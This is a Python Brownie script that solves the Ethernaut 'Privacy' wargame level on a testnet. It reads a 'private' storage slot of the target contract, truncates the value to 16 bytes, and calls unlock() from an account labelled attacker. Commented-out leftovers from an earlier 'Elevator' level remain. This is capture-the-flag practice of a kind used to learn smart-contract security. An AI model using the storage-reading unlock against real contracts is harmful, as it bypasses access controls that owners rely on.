from multiprocessing.connection import wait
from brownie import *
from brownie.convert import *
from brownie.network.state import Chain
from eth_utils import to_text
from web3 import Web3, eth

import os

# get the default priority fee and multiply by 5 to ensure the tx is executed rapidly
priority_fee=chain.priority_fee*5

# attacker=accounts[0]
acct_pwd=os.getenv("ACCT_PWD")
attacker=accounts.load('ethernaut_rinkeby', acct_pwd)

target_address='0x3B58000388771a548E18dC2F2a9a3aae8CDdB8a3'
target_ct=interface.Privacy(target_address)

# # # # deploy target contract for dev
# target_ct=Elevator.deploy({'from': attacker, 'priority_fee': priority_fee})
# target_address=target_ct.address
# target_floor=3

# deploy attacker contract
# attacker_contract=elevatorAttack.deploy(target_address, target_floor, {'from': attacker, 'priority_fee': priority_fee})

def main():
    # print('attacker_contract:', attacker_contract.address)
    print('target_address:', target_address)

    storage2=web3.eth.get_storage_at(target_address,5)
    storage2_hex=storage2.hex()
    storage2_bytes16=web3.toBytes(hexstr=storage2_hex)[0:16].hex()
    # storage2_txt=web3.toText(storage2)
    # storage2_tostring=to_string(storage2)
    
    print('storage1: ', storage2)
    print('storage2_hex: ', storage2_hex)
    print('storage2_bytes16: ', storage2_bytes16)
    # print('storage2: ', storage2_txt)

    tx=target_ct.unlock(storage2_bytes16, {'from': attacker, 'priority_fee': priority_fee})

    # print('tx_value:', tx.value)
    # print('target floor:', target_ct.floor())
    print('check locked() of target: ', target_ct.locked())

    
